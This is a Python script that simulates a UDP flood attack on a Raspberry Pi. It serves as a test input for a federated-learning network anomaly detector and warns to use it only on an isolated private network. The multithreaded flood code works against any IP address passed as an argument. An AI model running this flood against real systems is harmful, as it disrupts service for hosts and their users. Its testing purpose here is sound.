"""
udp_flood_attack.py — Network Anomaly Simulator
================================================
Run this script on a SECOND COMPUTER on the same private network as your
Raspberry Pi to simulate a UDP flood attack.

This will massively spike the Pi's `bytes_recv` network counter, which the
XFL client (client_xfl.py) and publisher (publisher.py) will detect as an
anomaly via the reconstruction loss exceeding the dynamic threshold.

Usage (from the attacker machine):
    pip install (no extra deps needed, uses standard library only)
    python udp_flood_attack.py <PI_IP_ADDRESS>

Example:
    python udp_flood_attack.py 192.168.1.105

WARNING: Only use this on your own private, isolated network.
         This is purely for testing and demonstration purposes.
"""

import socket
import sys
import time
import threading

# ── Configuration ──────────────────────────────────────────────
# Port to send to. UDP doesn't need a listener — the packets still
# arrive at the OS network stack and are counted in net_io_counters.
TARGET_PORT = 9999

# Payload size per packet (bytes). 1400 bytes is just under typical MTU.
PACKET_SIZE = 1400

# Attack duration in seconds.
# The XFL client collects 20 samples × 2.5s = ~50s of data.
# Run the attack for at least 60s to ensure it overlaps the full collection window.
ATTACK_DURATION_SECONDS = 60

# Number of parallel sender threads for maximum throughput.
NUM_THREADS = 2
# ───────────────────────────────────────────────────────────────

stop_event = threading.Event()

def flood(target_ip, thread_id):
    """Send UDP packets as fast as possible until stop_event is set."""
    payload = b'X' * PACKET_SIZE
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        while not stop_event.is_set():
            sock.sendto(payload, (target_ip, TARGET_PORT))
    except Exception as e:
        print(f"[Thread {thread_id}] Error: {e}")
    finally:
        sock.close()

def main():
    if len(sys.argv) < 2:
        print(__doc__)
        print("\nERROR: You must provide the target IP address.")
        print("Usage: python udp_flood_attack.py <PI_IP_ADDRESS>")
        sys.exit(1)

    target_ip = sys.argv[1]

    print("=" * 60)
    print("  XFL Network Anomaly Simulator — UDP Flood Attack")
    print("=" * 60)
    print(f"  Target IP   : {target_ip}")
    print(f"  Target Port : {TARGET_PORT} (UDP, no listener needed)")
    print(f"  Packet Size : {PACKET_SIZE} bytes")
    print(f"  Duration    : {ATTACK_DURATION_SECONDS} seconds")
    print(f"  Threads     : {NUM_THREADS}")
    print("=" * 60)
    print()
    print("[*] Starting attack in 3 seconds...")
    time.sleep(3)

    threads = []
    for i in range(NUM_THREADS):
        t = threading.Thread(target=flood, args=(target_ip, i), daemon=True)
        t.start()
        threads.append(t)

    print(f"[!] ATTACK STARTED — {NUM_THREADS} threads flooding {target_ip}:{TARGET_PORT}")
    print(f"[*] The XFL client monitors network I/O continuously in the background.")
    print(f"    The attack traffic will be captured in the NEXT FL training round.")
    print(f"[*] Watch publisher.py for: '[!] NETWORK ANOMALY FLAGGED'")
    print(f"[*] Watch the XFL dashboard for a spike in 'Gated (Anomalous)' bars.")
    print()

    # Countdown display
    for remaining in range(ATTACK_DURATION_SECONDS, 0, -1):
        print(f"\r[*] Attack stopping in {remaining:>3}s... ", end="", flush=True)
        time.sleep(1)

    stop_event.set()
    print("\n\n[*] Stop signal sent. Waiting for threads to finish...")
    for t in threads:
        t.join(timeout=2)

    print(f"\n[OK] Attack complete.")
    print(f"[*] The Raspberry Pi should have logged a network anomaly.")
    print(f"[*] Check the XFL Panel on your dashboard for increased 'Gated (Anomalous)' counts in the next FL round.")

if __name__ == "__main__":
    main()
